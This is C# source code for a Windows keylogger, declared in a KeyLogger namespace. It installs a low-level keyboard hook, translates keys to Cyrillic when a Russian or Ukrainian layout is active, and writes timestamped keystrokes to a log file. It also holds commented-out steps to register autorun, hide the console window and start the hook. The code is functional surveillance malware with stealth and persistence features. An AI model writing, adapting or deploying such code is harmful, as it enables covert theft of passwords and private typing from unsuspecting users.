using System;
using System.Diagnostics;
using System.Globalization;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Net.Mime;
using System.Text;
using KeyLogger;

class InterceptKeys
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    private static FileSystemWatcher _watcher;
    public static void Main()
    {
        DateWatcher trWatcher = new DateWatcher();
        _watcher = trWatcher.Track();
        //AutoRunner.SetAutorunValue(true);

        //var handle = GetConsoleWindow();

        //// Hide
        //ShowWindow(handle, SW_HIDE);

        //_hookID = SetHook(_proc);
        //Application.Run();
        //UnhookWindowsHookEx(_hookID);
        Console.ReadLine();
    }

    public static bool StopWorking { get; set; }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll")]
    static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")]
    static extern uint GetWindowThreadProcessId(IntPtr hwnd, IntPtr proccess);
    [DllImport("user32.dll")]
    static extern IntPtr GetKeyboardLayout(uint thread);

    private static CultureInfo GetCurrentKeyboardLayout()
    {
        try
        {
            IntPtr foregroundWindow = GetForegroundWindow();
            uint foregroundProcess = GetWindowThreadProcessId(foregroundWindow, IntPtr.Zero);
            int keyboardLayout = GetKeyboardLayout(foregroundProcess).ToInt32() & 0xFFFF;
            return new CultureInfo(keyboardLayout);
        }
        catch (Exception)
        {
            return new CultureInfo(1033); // Assume English if something went wrong.
        }
    }

    private static DateTime lastChanges = DateTime.Now;

    private static IntPtr HookCallback(
        int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (StopWorking)
        {
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        var culture = GetCurrentKeyboardLayout();

        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);

            if (culture.Name == "ru-RU" || culture.Name == "uk-UA")
            {
                string keyString = Convert.ToChar(GetRuSymbol(vkCode)).ToString();
                StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
                if (lastChanges.TimeOfDay.Add(new TimeSpan(0, 0, 0, 3)) < DateTime.Now.TimeOfDay)
                {
                    sw.Write(Environment.NewLine);
                    sw.Write(lastChanges + " ");
                }

                sw.Write(keyString);
                sw.Close();
            }
        }

        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    private static string GetRuSymbol(int code)
    {
        switch (code)
        {
            case 81: return "Й";
            case 87: return "Ц";
            case 69: return "У";
            case 82: return "К";
            case 84: return "Е";
            case 89: return "Н";
            case 85: return "Г";
            case 73: return "Ш";
            case 79: return "Щ";
            case 80: return "З";
            case 219: return "Х";
            case 221: return "Ъ";
            case 65: return "Ф";
            case 83: return "Ы";
            case 68: return "В";
            case 70: return "А";
            case 71: return "П";
            case 72: return "Р";
            case 74: return "О";
            case 75: return "Л";
            case 76: return "Д";
            case 186: return "Ж";
            case 222: return "Э";
            case 90: return "Я";
            case 88: return "Ч";
            case 67: return "С";
            case 86: return "М";
            case 66: return "И";
            case 78: return "Т";
            case 77: return "Ь";
            case 188: return "Б";
            case 190: return "Ю";
            case 192: return "Ё";
            default: Keys inp = (Keys)(code); return inp.ToString();

        }
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    const int SW_HIDE = 0;

}